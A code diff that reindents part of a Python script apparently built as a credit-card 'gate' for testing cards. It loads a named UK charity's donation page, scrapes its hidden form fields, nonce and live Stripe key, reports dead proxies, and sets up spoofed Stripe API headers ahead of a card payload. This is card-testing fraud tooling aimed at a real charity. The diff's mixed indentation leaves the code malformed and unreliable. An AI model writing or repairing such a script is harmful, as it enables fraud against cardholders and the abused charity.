@@ -36,30 +36,31 @@ def toc_gate(ccx):
         }
 
 	response = s.get(
-        'https://www.foursquare.org.uk/donate/',
-        headers=headers
-    )
+    'https://www.foursquare.org.uk/donate/',
+    headers=headers
+)
+
 try:
-	post = re.search(r'name="post_id"\s+value="([^"]+)"', response.text).group(1)
-	form = re.search(r'name="form_id"\s+value="([^"]+)"', response.text).group(1)
-	refer = re.search(r'name="referer_title"\s+value="([^"]+)"', response.text).group(1)
-	queried = re.search(r'name="queried_id"\s+value="([^"]+)"', response.text).group(1)
-	char_form = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', response.text).group(1)
-	nonce = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text).group(1)
-	camp = re.search(r'name="campaign_id"\s+value="([^"]+)"', response.text).group(1)
-	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
+    post = re.search(r'name="post_id"\s+value="([^"]+)"', response.text).group(1)
+    form = re.search(r'name="form_id"\s+value="([^"]+)"', response.text).group(1)
+    refer = re.search(r'name="referer_title"\s+value="([^"]+)"', response.text).group(1)
+    queried = re.search(r'name="queried_id"\s+value="([^"]+)"', response.text).group(1)
+    char_form = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', response.text).group(1)
+    nonce = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text).group(1)
+    camp = re.search(r'name="campaign_id"\s+value="([^"]+)"', response.text).group(1)
+    pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
 
 except:
     return "Proxy dead or site changed"
 
-	headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0',
-        }
+headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'user-agent': 'Mozilla/5.0',
+}
 
 	data = {
             'type': 'card',
